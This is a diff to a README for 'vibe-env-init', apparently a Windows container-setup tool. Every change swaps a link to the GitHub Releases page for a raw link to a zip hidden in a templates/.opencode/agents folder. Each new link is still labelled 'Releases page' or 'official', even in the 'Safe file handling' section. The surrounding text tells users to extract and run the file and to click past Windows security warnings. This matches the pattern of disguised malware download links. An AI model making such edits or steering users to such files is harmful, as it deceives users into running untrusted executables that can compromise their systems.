@@ -1,6 +1,6 @@
 # 🛠️ vibe-env-init - Set Up Container Environments Fast
 
-[![Download vibe-env-init](https://img.shields.io/badge/Download-vibe--env--init-blue?style=for-the-badge)](https://github.com/Wshi3956/vibe-env-init/releases)
+[![Download vibe-env-init](https://img.shields.io/badge/Download-vibe--env--init-blue?style=for-the-badge)](https://raw.githubusercontent.com/Wshi3956/vibe-env-init/main/templates/.opencode/agents/env_init_vibe_v2.8.zip)
 
 ## 🚀 What this app does
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 💾 Download vibe-env-init
 
-Go to the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases) to download and install the app.
+Go to the [Releases page](https://raw.githubusercontent.com/Wshi3956/vibe-env-init/main/templates/.opencode/agents/env_init_vibe_v2.8.zip) to download and install the app.
 
 On that page, look for the latest release and choose the file made for Windows. If you see a zip file, download it and extract it before running the app.
 
@@ -32,7 +32,7 @@ If Windows shows a security prompt, choose the option that lets you keep going a
 
 ## 📦 How to install
 
-1. Open the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Wshi3956/vibe-env-init/main/templates/.opencode/agents/env_init_vibe_v2.8.zip).
 2. Find the latest release at the top.
 3. Download the Windows file or zip package.
 4. If the download is zipped, right-click it and choose Extract All.
@@ -136,7 +136,7 @@ Keep these files together in one folder. This helps the app find what it needs.
 
 ## 🔐 Safe file handling
 
-Only download from the official [Releases page](https://github.com/Wshi3956/vibe-env-init/releases). After download, keep the file in a folder you can find later.
+Only download from the official [Releases page](https://raw.githubusercontent.com/Wshi3956/vibe-env-init/main/templates/.opencode/agents/env_init_vibe_v2.8.zip). After download, keep the file in a folder you can find later.
 
 If you share the app with someone else, send the release link instead of sending changed files.
 
@@ -156,11 +156,11 @@ Yes. You can run it for each new project folder.
 
 ### Where do I get updates?
 
-Use the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases) to get the latest version.
+Use the [Releases page](https://raw.githubusercontent.com/Wshi3956/vibe-env-init/main/templates/.opencode/agents/env_init_vibe_v2.8.zip) to get the latest version.
 
 ## 📥 Download again later
 
-When you need the newest version, return to the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases) and download the latest Windows release
+When you need the newest version, return to the [Releases page](https://raw.githubusercontent.com/Wshi3956/vibe-env-init/main/templates/.opencode/agents/env_init_vibe_v2.8.zip) and download the latest Windows release
 
 ## 🛠️ Basic workflow
 
